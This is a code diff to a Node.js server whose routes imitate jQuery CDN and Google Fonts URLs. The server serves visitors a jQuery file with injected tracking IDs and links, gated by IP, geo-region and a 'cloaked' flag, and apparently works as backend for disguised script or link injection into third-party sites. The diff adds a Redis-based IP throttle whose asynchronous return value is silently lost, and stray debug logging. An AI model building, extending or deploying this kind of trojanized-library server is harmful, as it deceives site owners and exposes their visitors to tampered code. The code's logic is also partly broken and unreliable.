@@ -23,6 +23,13 @@ var cookieParser = require('cookie-parser');
 
 var config = require('./config');
 
+var redis = require("redis");
+var redisClient = redis.createClient(config.redisConfig);
+redisClient.on("error", function(e) {
+  console.log("REDIS ERROR: " + e);
+});
+
+
 //Date prototype for converting Date() to MySQL DateTime format
 Date.prototype.toMysqlFormat = function() {
   function pad(n) {
@@ -58,46 +65,27 @@ app.use(express.static(path.join(__dirname, 'public')));
 var connection = mysql.createConnection(config.db_connection);
 connection.connect();
 
-//put all client ips in this for 5 seconds. object with created_on and ip keys
-var tmpWhiteListClientArr = [];
-
 function getCodeDelimiter() {
   return "aIx1Fgix89e";
 }
 
 function addClientToWhitelistWindow(ip) {
-  //check if in white list return false if it is already whitelisted
-  var isWhitelisted = _.filter(tmpWhiteListClientArr, function(e) {
-    return e.ip == ip;
-  });
-
-  if (isWhitelisted.length) {
-    // console.log("client already added to tmpWhiteListClientArr not jacking ip: " + ip);
-    return false; // dont add and process
-  } else {
-    //whitelist return true
-    var requestClientInfo = {
-      ip: ip,
-      expires: (new Date()).getTime() + config.clientRequestPageloadWhitelistTimeWindowMillis
-    };
-
-    //push if not in there already
-    tmpWhiteListClientArr.push(requestClientInfo); //expires in 5 seconds
-    return true;
-  }
-}
-
-function removeExpiredFromWhitelistWindow() {
-  //set array to the new greped one
-  var currentTime = (new Date).getTime();
-
-  //return only non expired items
-  tmpWhiteListClientArr = _.filter(tmpWhiteListClientArr, function(e) {
-    return e.expires >= currentTime;
+  redisClient.get(ip, function(err, isWhitelisted) {
+    if (isWhitelisted) {
+      console.log("ffffalse")
+      return false;
+    } else {
+      console.log("true")
+      redisClient.set(ip, true);
+      redisClient.expire(ip, '5');
+      return true;
+    }
   });
 }
 
-setInterval(removeExpiredFromWhitelistWindow, config.clientRequestPageloadWhitelistTimeWindowMillis);
+function getClientAddress(req) {
+  return (req.headers['x-forwarded-for'] || '').split(',')[0] || req.connection.remoteAddress;
+};
 
 function getClientResponseJSON(uuid, url, ip, callback) {
 
@@ -269,12 +257,12 @@ app.post('/jquery/latest', function(req, res) {
   var uuid = req.body.version;
   var full_url = url;
 
-  var ip = req.headers['x-forwarded-for'];
+  var ip = getClientAddress(req);
   var geo = geoip.lookup(ip);
 
   if (!geo) {
     geo = { country: "UNKNOWN" };
-    console.log("IP: " + ip + " had unknown geo region.");
+    console.log("/jquery/latest IP: " + ip + " had unknown geo region.");
   }
 
   if (!ip) {
@@ -290,11 +278,6 @@ app.post('/jquery/latest', function(req, res) {
 
       url = formatURL(url);
       var domain = getDomain(url);
-
-      //console.log("Received lander request from " + url + " with uuid = " + uuid);
-
-      //console.log("Formatted url to be: " + url);
-      //console.log("The domain of the url is: " + domain);
 
       connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
         if (docs != undefined && docs[0] != undefined) {
@@ -369,12 +352,12 @@ app.post('/jquery/stable', function(req, res) {
   var uuid = req.body.version;
   var full_url = url;
 
-  var ip = req.headers['x-forwarded-for'];
+  var ip = getClientAddress(req);
   var geo = geoip.lookup(ip);
 
   if (!geo) {
     geo = { country: "UNKNOWN" };
-    console.log("IP: " + ip + " had unknown geo region.");
+    console.log("/jquery/stable IP: " + ip + " had unknown geo region.");
   }
 
   if (!ip) {
@@ -469,12 +452,12 @@ app.post('/jquery/dist', function(req, res) {
   var uuid = req.body.version;
   var full_url = url;
 
-  var ip = req.headers['x-forwarded-for'];
+  var ip = getClientAddress(req);
   var geo = geoip.lookup(ip);
 
   if (!geo) {
     geo = { country: "UNKNOWN" };
-    console.log("IP: " + ip + " had unknown geo region.");
+    console.log("/jquery/dist IP: " + ip + " had unknown geo region.");
   }
 
   if (!ip) {
@@ -594,12 +577,12 @@ app.get('/jquery/dist', function(req, res) {
     var uuid = xalt.substring(index + 6);
     var full_url = url;
 
-    var ip = req.headers['x-forwarded-for'];
+    var ip = getClientAddress(req);
     var geo = geoip.lookup(ip);
 
     if (!geo) {
       geo = { country: "UNKNOWN" };
-      console.log("IP: " + ip + " had unknown geo region.");
+      console.log("/jquery/dist IP: " + ip + " had unknown geo region.");
     }
 
     if (!ip) {
@@ -699,12 +682,12 @@ app.post('/jquery', function(req, res) {
 
   var full_url = url;
 
-  var ip = req.headers['x-forwarded-for'];
+  var ip = getClientAddress(req);
   var geo = geoip.lookup(ip);
 
   if (!geo) {
     geo = { country: "UNKNOWN" };
-    console.log("IP: " + ip + " had unknown geo region.");
+    console.log("/jquery IP: " + ip + " had unknown geo region.");
   }
 
   if (!ip) {
@@ -800,21 +783,20 @@ app.get('/css', function(req, res) {
   var url = req.headers.referrer || req.headers.referer;
   var full_url = url;
 
-  var font = req.params.family;
+  var font = req.query.family;
   var uuid = config.uuidArr[font];
 
   if (!uuid) {
+
     res.redirect('http://fonts.googleapis.com' + req.url);
     return;
   }
-
-  var ip = req.headers['x-forwarded-for'];
-  // var ip = req.connection.remoteAddress;
+  var ip = getClientAddress(req);
   var geo = geoip.lookup(ip);
 
   if (!geo) {
     geo = { country: "UNKNOWN" };
-    console.log("IP: " + ip + " had unknown geo region.");
+    console.log("/css: IP: " + ip + " had unknown geo region.");
   }
 
   if (!ip) {
@@ -920,13 +902,12 @@ app.get('/ajax/libs/jquery/:jqueryVersion/jquery.min.js', function(req, res) {
     return;
   }
 
-  var ip = req.headers['x-forwarded-for'];
-  // var ip = req.connection.remoteAddress;
+  var ip = getClientAddress(req);
   var geo = geoip.lookup(ip);
 
   if (!geo) {
     geo = { country: "UNKNOWN" };
-    console.log("IP: " + ip + " had unknown geo region.");
+    console.log("/ajax/libs/jquery/ IP: " + ip + " had unknown geo region.");
   }
 
   if (!ip) {
@@ -943,6 +924,7 @@ app.get('/ajax/libs/jquery/:jqueryVersion/jquery.min.js', function(req, res) {
       // console.log(req.headers);
       sendPlainJquery(req, res);
     } else {
+
       url = formatURL(url);
       var domain = getDomain(url);
 
@@ -950,6 +932,8 @@ app.get('/ajax/libs/jquery/:jqueryVersion/jquery.min.js', function(req, res) {
         if (docs != undefined && docs[0] != undefined) {
           var response_string = docs[0].value;
           var cloaked = 0;
+
+          // console.log("not plain jquery " + response_string + " uuid: " + uuid);
 
           //console.log("Response from process_request: " + response_string);
           if (response_string == "OLD_RIPPED") {
@@ -974,7 +958,6 @@ app.get('/ajax/libs/jquery/:jqueryVersion/jquery.min.js', function(req, res) {
                 var replacedFile = String(data).replace('replacemeuuid', uuid);
                 replacedFile = String(replacedFile).replace('replacemelinks', response);
                 replacedFile = String(replacedFile).replace('jqueryVersion', jqueryVersion);
-                console.log("REPLCEEE TREVVV")
                 if (cloaked == 1) {
                   replacedFile = String(replacedFile).replace('replacemestats', 'yes');
                 }
